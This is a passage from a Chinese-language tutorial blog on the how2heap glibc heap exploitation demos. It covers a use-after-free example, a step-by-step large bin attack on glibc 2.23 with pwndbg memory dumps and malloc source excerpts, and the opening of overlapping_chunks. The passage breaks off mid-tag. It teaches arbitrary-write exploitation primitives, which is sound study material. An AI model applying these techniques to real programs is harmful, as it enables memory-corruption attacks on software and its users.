位系统的时候用 w（四字节 32 位），在 64 位系统的时候用 g（八字节 64 位）</p></blockquote><p>这时候我们往 a 的内存里面写入了”this is A!”的数据<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-15.png#clientId=u347f053a-7aac-4&from=paste&height=297&id=u2a9dd95c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=594&originWidth=951&originalType=binary&size=779596&status=done&style=none&taskId=u7c309d88-ed9c-4395-af94-51e0ef3120c&width=475.5" alt="image.png"><br>查看指针处数据<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-16.png#clientId=u347f053a-7aac-4&from=paste&height=40&id=uc43258b2&name=image.png&originHeight=80&originWidth=557&originalType=binary&size=61038&status=done&style=none&taskId=u36a0855c-611f-4636-8b65-a085361d73f&width=278.5" alt="image.png"><br>写入的数据就是上述字符串的 ASCII 码<br>当我们执行 free(a)释放 a 的内存块后，可以发现 a 先被放入了 unsortedbin 中，且 fd 指针和 bk 指针都指向了 main_arena<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-17.png#clientId=u347f053a-7aac-4&from=paste&height=471&id=uaab4248c&name=image.png&originHeight=941&originWidth=1113&originalType=binary&size=1596503&status=done&style=none&taskId=u46c0ff91-6ad9-4fbc-b7d0-fe90583f478&width=556.5" alt="image.png"><br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-18.png#clientId=u347f053a-7aac-4&from=paste&height=225&id=u3f41a094&margin=%5Bobject%20Object%5D&name=image.png&originHeight=449&originWidth=864&originalType=binary&size=548857&status=done&style=none&taskId=u1a73c58c-a933-4d02-afde-ce7d7e95359&width=432" alt="image.png"><br>执行 c = malloc(0x500)，发现 c 分配到的内存块就是原来 a 分配到的内存块<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-19.png#clientId=u347f053a-7aac-4&from=paste&height=457&id=u07255dc9&name=image.png&originHeight=913&originWidth=954&originalType=binary&size=1290624&status=done&style=none&taskId=u8044fb4e-a813-4d6d-8367-2d0ae72e4ac&width=477" alt="image.png"><br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-20.png#clientId=u347f053a-7aac-4&from=paste&height=27&id=u1ec3e24f&name=image.png&originHeight=53&originWidth=341&originalType=binary&size=30323&status=done&style=none&taskId=u1c7f382b-fb27-4d54-a074-30f5ab0390c&width=170.5" alt="image.png"><br>在 glibc-2.28 中，内存块全部分配，不在中 unsorted bin 保留<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-21.png#clientId=u347f053a-7aac-4&from=paste&height=229&id=uc4dc40e2&name=image.png&originHeight=458&originWidth=457&originalType=binary&size=297581&status=done&style=none&taskId=u10848018-20f0-4fd5-9087-0a157da04fb&width=228.5" alt="image.png"><br>然后在写入”This is C!”后查看内存情况<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-22.png#clientId=u347f053a-7aac-4&from=paste&height=322&id=uc4014290&margin=%5Bobject%20Object%5D&name=image.png&originHeight=644&originWidth=1129&originalType=binary&size=1108386&status=done&style=none&taskId=ucf59ceba-350e-4979-b446-a6239d8e756&width=564.5" alt="image.png"><br>可以发现和从之前的 0x41 变成了 0x43，说明从 A 变成了 C，然后继续执行<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-23.png#clientId=u347f053a-7aac-4&from=paste&height=30&id=u83f5467d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=59&originWidth=573&originalType=binary&size=52360&status=done&style=none&taskId=ue3b48849-bd89-4ac8-85de-3f0052f6e91&width=286.5" alt="image.png"><br>这说明这里其实存在一个漏洞：free 掉之后没有把指针置 0，造成一个 UAF(use after free)漏洞。就是 a 已经 free 掉之后又重新把那块地址分配回来再编辑会把 a 所指向的地址的内容也编辑了(也就是这个时候 a 跟 c 指向的是同一内存地址)。<br>修补：free 掉 a 之后，让 a 再指向 null。</p><h1 id="large-bin-attack-2-23"><a href="#large-bin-attack-2-23" class="headerlink" title="large_bin_attack-2.23"></a>large_bin_attack-2.23</h1><p>程序运行结果如下：<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-24.png#clientId=u38185df4-f4d6-4&from=paste&height=409&id=u01dce496&margin=%5Bobject%20Object%5D&name=image.png&originHeight=817&originWidth=1905&originalType=binary&size=1486851&status=done&style=none&taskId=u795c39c6-fa0c-4eb5-bdbd-b2f34b0802f&width=952.5" alt="image.png"><br>该技术可用于修改任意地址的值，例如栈上的变量 stack_var1 和 stack_var2。在实践中常常作为其他漏洞利用的前奏，例如在 fastbin attack 中用于修改全局变量 global_max_fast 为一个很大的值。<br>首先我们分配 chunk p1, p2 和 p3，并且在它们之间插入其他的 chunk 以防止在释放时被合并。此时的内存布局如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cpp">pwndbg&gt; x/<span class="hljs-number">2</span>gx &amp;stack_var1<br><span class="hljs-number">0x7ffffffed9d0</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x00000000080079b0</span><br>pwndbg&gt; x/<span class="hljs-number">8</span>gx p1<span class="hljs-number">-6</span><br><span class="hljs-number">0x8006fe0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8006ff0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007000</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000431</span> &lt;-- p1<br><span class="hljs-number">0x8007010</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">8</span>gx p2<span class="hljs-number">-6</span><br><span class="hljs-number">0x8007440</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007450</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007460</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000511</span>  &lt;-- p2<br><span class="hljs-number">0x8007470</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">8</span>gx p3<span class="hljs-number">-6</span><br><span class="hljs-number">0x8007980</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007990</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x80079a0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000511</span>  &lt;-- p3<br><span class="hljs-number">0x80079b0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">8</span>gx p3+(<span class="hljs-number">0x510</span>/<span class="hljs-number">8</span>)<span class="hljs-number">-2</span><br><span class="hljs-number">0x8007eb0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000020151</span>  &lt;-- top<br><span class="hljs-number">0x8007ec0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007ed0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007ee0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure><p>然后依次释放掉 p1 和 p2，这两个 free chunk 将被放入 unsorted bin<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-25.png#clientId=u38185df4-f4d6-4&from=paste&height=426&id=u15aba304&name=image.png&originHeight=852&originWidth=688&originalType=binary&size=355625&status=done&style=none&taskId=u6ad399c3-0c6c-40b5-b103-1c88c38db82&width=344" alt="image.png"><br>内存布局即：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp">pwndbg&gt; x/<span class="hljs-number">8</span>gx p1<span class="hljs-number">-2</span><br><span class="hljs-number">0x8007000</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000431</span>  &lt;-- p1 [be freed]<br><span class="hljs-number">0x8007010</span>:      <span class="hljs-number">0x00007fffff3f3b78</span>      <span class="hljs-number">0x0000000008007460</span><br><span class="hljs-number">0x8007020</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007030</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">8</span>gx p2<span class="hljs-number">-2</span><br><span class="hljs-number">0x8007460</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000511</span>  &lt;-- p2 [be freed]<br><span class="hljs-number">0x8007470</span>:      <span class="hljs-number">0x0000000008007000</span>      <span class="hljs-number">0x00007fffff3f3b78</span><br><span class="hljs-number">0x8007480</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007490</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure><p>类似这样<img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622799357459-3e0b24c7-1a0a-4b1d-a824-ac169d300988.png#clientId=u38185df4-f4d6-4&from=paste&height=262&id=u8d85b49e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=392&originWidth=906&originalType=binary&size=50371&status=done&style=none&taskId=u3f890383-beb1-48e0-ac59-759732b834b&width=605" alt="image.png"><br>接下来随便 malloc 一个大小为 0x90 的 chunk，则 p1 被切分为两块，一块作为分配的 chunk 返回，剩下的一块继续留在 unsorted bin.（p1 的作用就在这里，如果没有 p1，那么切分的将是 p2）。<br>要注意的是：切割后 p1 的大小是 0x390 &lt; 0x3f0 大小属于 small bin，而 p2 的大小是 0x510 属于 large bin。<br>p2 则被整理回对应的 large bin 链表中：<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-26.png#clientId=u38185df4-f4d6-4&from=paste&height=447&id=u84e1fe75&name=image.png&originHeight=893&originWidth=657&originalType=binary&size=654600&status=done&style=none&taskId=u37f8e899-1229-4164-b4f1-edd1e453ddb&width=328.5" alt="image.png"><br>过程如下：</p><ul><li>从 unsorted bin 中拿出最后一个 chunk（p1 属于 small bin 的范围）</li><li>把这个 chunk 放入 small bin 中，并标记这个 small bin 有空闲的 chunk</li><li>再从 unsorted bin 中拿出最后一个 chunk（p2 属于 large bin 的范围）</li><li>把这个 chunk 放入 large bin 中，并标记这个 large bin 有空闲的 chunk</li><li>现在 unsorted bin 为空，从 small bin （p1）中分配一个小的 chunk 满足请求 0x90，并把剩下的 chunk（0x330 - 0xa0）放入 unsorted bin 中</li></ul><p>此时的内存布局如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs cpp">pwndbg&gt; x/<span class="hljs-number">40</span>gx p1<span class="hljs-number">-2</span><br><span class="hljs-number">0x8007000</span>:      <span class="hljs-number">0x0000000000000000</span>&lt;p1<span class="hljs-number">-2</span> <span class="hljs-number">0x00000000000000a1</span>&lt;-- p1<span class="hljs-number">-1</span><br><span class="hljs-number">0x8007010</span>:      <span class="hljs-number">0x00007fffff3f3f68</span>      <span class="hljs-number">0x00007fffff3f3f68</span><br><span class="hljs-number">0x8007020</span>:      <span class="hljs-number">0x0000000008007000</span>      <span class="hljs-number">0x0000000008007000</span><br><span class="hljs-number">0x8007030</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007040</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007050</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007060</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007070</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007080</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007090</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x80070a0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000391</span>  &lt;-- p1<span class="hljs-number">-2</span> [be freed]<br><span class="hljs-number">0x80070b0</span>:      <span class="hljs-number">0x00007fffff3f3b78</span>      <span class="hljs-number">0x00007fffff3f3b78</span>  &lt;-- fd, bk<br><span class="hljs-number">0x80070c0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x80070d0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x80070e0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x80070f0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007100</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007110</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007120</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007130</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">8</span>gx p2<span class="hljs-number">-2</span><br><span class="hljs-number">0x8007460</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000511</span>  &lt;-- p2<span class="hljs-number">-2</span> [be freed]<br><span class="hljs-number">0x8007470</span>:      <span class="hljs-number">0x00007fffff3f3fa8</span>      <span class="hljs-number">0x00007fffff3f3fa8</span>  &lt;-- fd, bk<br><span class="hljs-number">0x8007480</span>:      <span class="hljs-number">0x0000000008007460</span>      <span class="hljs-number">0x0000000008007460</span>  &lt;-- fd_nextsize, bk_nextsize<br><span class="hljs-number">0x8007490</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure><p>整理的过程如下所示，需要注意的是 large bins 中 chunk 按 fd 指针的顺序从大到小排列，如果大小相同则按照最近使用顺序排列：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/* place chunk in bin */</span><br><br><span class="hljs-keyword">if</span> (in_smallbin_range (size))<br>  &#123;<br>      [ ... ]<br>  &#125;<br><span class="hljs-keyword">else</span><br>  &#123;<br>    victim_index = largebin_index (size);<br>    bck = bin_at (av, victim_index);<br>    fwd = bck-&gt;fd;<br><br>    <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>    <span class="hljs-keyword">if</span> (fwd != bck)<br>      &#123;<br>        <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>        size |= PREV_INUSE;<br>        <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>        assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size) &lt; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (bck-&gt;bk-&gt;size))<br>          &#123;<br>              [ ... ]<br>          &#125;<br>        <span class="hljs-keyword">else</span><br>          &#123;<br>            assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">while</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) size &lt; fwd-&gt;size)<br>              &#123;<br>                  [ ... ]<br>              &#125;<br><br>            <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) size == (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) fwd-&gt;size)<br>              [ ... ]<br>            <span class="hljs-keyword">else</span><br>              &#123;<br>                victim-&gt;fd_nextsize = fwd;<br>                victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                fwd-&gt;bk_nextsize = victim;<br>                victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>              &#125;<br>            bck = fwd-&gt;bk;<br>          &#125;<br>      &#125;<br>    <span class="hljs-keyword">else</span><br>      [ ... ]<br>  &#125;<br><br>mark_bin (av, victim_index);<br>victim-&gt;bk = bck;<br>victim-&gt;fd = fwd;<br>fwd-&gt;bk = victim;<br>bck-&gt;fd = victim;<br></code></pre></td></tr></table></figure><p>又 free 了一个大小为 0x510 的 large bin chunk。<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-27.png#clientId=u38185df4-f4d6-4&from=paste&height=93&id=uc5e947d7&name=image.png&originHeight=185&originWidth=1115&originalType=binary&size=223170&status=done&style=none&taskId=u43bf1cde-908a-435d-8a89-7fd4ddddc5e&width=557.5" alt="image.png"><br>也就是说现在 unsorted bin 有两个空闲的 chunk，末尾是大小 0x390 大小的 chunk，第一个是 size 为 0x510 的 chunk。<br>现在，我们分配一个大小小于释放的第一个大块的块。这将把释放的第二个大块移动到 largebin 列表中，使用释放的第一个大块的部分进行分配，并将释放的第一个大块的剩余部分重新插入 unsorted bin 中: [0x80070a0]<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-28.png#clientId=u38185df4-f4d6-4&from=paste&height=625&id=u13e07ab3&name=image.png&originHeight=859&originWidth=672&originalType=binary&size=561185&status=done&style=none&taskId=ucad99ee5-53d8-4874-a74e-dc69d0f7e7e&width=489" alt="image.png"><br>然后我们修改 p2（large bin chunk），修改结果如下：<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-29.png#clientId=u38185df4-f4d6-4&from=paste&height=163&id=u59355196&name=image.png&originHeight=325&originWidth=816&originalType=binary&size=162888&status=done&style=none&taskId=u309e3074-8bf7-412f-9996-95c4dd65a3c&width=408" alt="image.png"><br>此时的内存布局变为：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp">pwndbg&gt; x/<span class="hljs-number">8</span>gx p2<span class="hljs-number">-2</span><br><span class="hljs-number">0x8007460</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x00000000000003f1</span><br><span class="hljs-number">0x8007470</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x00007ffffffed9c0</span><br><span class="hljs-number">0x8007480</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x00007ffffffed9a8</span><br><span class="hljs-number">0x8007490</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure><p><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-30.png#clientId=u38185df4-f4d6-4&from=paste&height=111&id=u6a033717&name=image.png&originHeight=221&originWidth=829&originalType=binary&size=34972&status=done&style=none&taskId=u06ac7c6d-fd63-4162-939a-ef7769d5588&width=414.5" alt="image.png"><br>进行 malloc(0x90) 操作，此时</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp">pwndbg&gt; x/<span class="hljs-number">8</span>gx p2<span class="hljs-number">-2</span><br><span class="hljs-number">0x8007460</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x00000000000003f1</span><br><span class="hljs-number">0x8007470</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x00000000080079a0</span><br><span class="hljs-number">0x8007480</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x00000000080079a0</span><br><span class="hljs-number">0x8007490</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">8</span>gx p3<span class="hljs-number">-2</span><br><span class="hljs-number">0x80079a0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000511</span><br><span class="hljs-number">0x80079b0</span>:      <span class="hljs-number">0x0000000008007460</span>      <span class="hljs-number">0x00007ffffffed9c0</span><br><span class="hljs-number">0x80079c0</span>:      <span class="hljs-number">0x0000000008007460</span>      <span class="hljs-number">0x00007ffffffed9a8</span><br><span class="hljs-number">0x80079d0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">2</span>gx &amp;stack_var1<br><span class="hljs-number">0x7ffffffed9d0</span>: <span class="hljs-number">0x00000000080079a0</span>      <span class="hljs-number">0x00000000080079b0</span><br>pwndbg&gt; x/<span class="hljs-number">2</span>gx &amp;stack_var2<br><span class="hljs-number">0x7ffffffed9c8</span>: <span class="hljs-number">0x00000000080079a0</span>      <span class="hljs-number">0x00000000080079a0</span><br></code></pre></td></tr></table></figure><p>可以看到，栈上的两个变量也被修改成了 victim，对应的语句分别是 bck-&gt;fd = victim; 和 ictim-&gt;bk_nextsize-&gt;fd_nextsize = victim;。<br>与第一次 malloc(0x90) 过程类似：</p><ul><li>从 unsorted bin 中拿出最后一个 chunk（size = 0390），放入 small bin 中，标记该序列的 small bin 有空闲 chunk</li><li>再从 unsorted bin 中拿出最后一个 chunk（size = 0x510）</li></ul><p>由于这个过程中判断条件 (unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size) 为假，程序将进入 else 分支，<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-31.png#clientId=u38185df4-f4d6-4&from=paste&height=75&id=u596894f8&margin=%5Bobject%20Object%5D&name=image.png&originHeight=149&originWidth=840&originalType=binary&size=41189&status=done&style=none&taskId=u714d7b80-03ec-439b-8b48-c860cd2a7df&width=420" alt="image.png"><br>其中 fwd 是 fake p2，victim 是 p3，接着 bck 被赋值为 (&amp;stack_var1 - 2)。<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-32.png#clientId=u38185df4-f4d6-4&from=paste&height=66&id=u9b02184b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=131&originWidth=855&originalType=binary&size=43024&status=done&style=none&taskId=uf9af952d-279d-4d9b-9420-9434415605d&width=427.5" alt="image.png"><br><strong>在一个序列的 large bin chunk 中 fd_nextsize 的方向是 size 变小的方向。这个循环的意思是找到一个比当前 fwd 指的 chunk 要大的地址，存入 fwd 中</strong>。<br>由于当前 fwd 的 size 被我们修改过 =0x3f0，所以没有进入循环。<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-33.png#clientId=u38185df4-f4d6-4&from=paste&height=62&id=ub93e4540&margin=%5Bobject%20Object%5D&name=image.png&originHeight=123&originWidth=849&originalType=binary&size=40594&status=done&style=none&taskId=u018824df-aecc-4366-845a-e9c3f038d74&width=424.5" alt="image.png"><br>这个原本的意思是把从 unsorted bin 中来的 chunk 插入这个序列中，但是这里没有检查合法性。这里存在这一个利用：<br>之前做的构造，把 fwd 的 bk_nextsize 指向了另一个地址。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize<br><span class="hljs-comment">// then</span><br>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br></code></pre></td></tr></table></figure><p>也就是：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp">addr2-&gt;fd_nextsize = victim;<br><span class="hljs-comment">// 等价于</span><br>*(addr2+<span class="hljs-number">4</span>) = victim;<br></code></pre></td></tr></table></figure><p>所以修改了 stack_var2 的值。<br>接着还存着另外一个利用：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp">bck = fwd-&gt;bk;<br><span class="hljs-comment">// ......</span><br>mark_bin (av, victim_index);<br>victim-&gt;bk = bck;<br>victim-&gt;fd = fwd;<br>fwd-&gt;bk = victim;<br>bck-&gt;fd = victim;<br></code></pre></td></tr></table></figure><p>修改了 stack_var1 的值。至此利用完毕。<br><strong>总结一下利用的条件</strong>：</p><ul><li>可以修改一个 large bin chunk 的 data</li><li>从 unsorted bin 中来的 large bin chunk 要紧跟在被构造过的 chunk 的后面</li></ul><h1 id="overlapping-chunks-2-23"><a href="#overlapping-chunks-2-23" class="headerlink" title="overlapping_chunks-2.23"></a>overlapping_chunks-2.23</h1><p>运行调试，在进行过 3 次 malloc 后<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-34.png#clientId=u347f053a-7aac-4&from=paste&height=301&id=u0e8f706f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=602&originWidth=1091&originalType=binary&size=733998&status=done&style=none&taskId=u4084056e-68e3-490a-b30e-7de2fdfe0a1&width=545.5" alt="image.png"><br>查看 heap 信息<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-35.png#clientId=u347f053a-7aac-4&from=paste&height=297&id=u5f03230f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=594&originWidth=572&originalType=binary&size=337493&status=done&style=none&taskId=u73c5c748-0a2b-4343-9486-782c2265e38&width=286" alt="image.png"><br>然后给三个 chunk 赋初值<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-36.png#clientId=u347f053a-7aac-4&from=paste&height=287&id=u4bf7a318&margin=%5Bobject%20Object%5D&name=image.png&originHeight=574&originWidth=1049&originalType=binary&size=657616&status=done&style=none&taskId=u1cf39fd7-f761-4451-813a-cf1434a6e3a&width=524.5" alt="image.png"><br><img 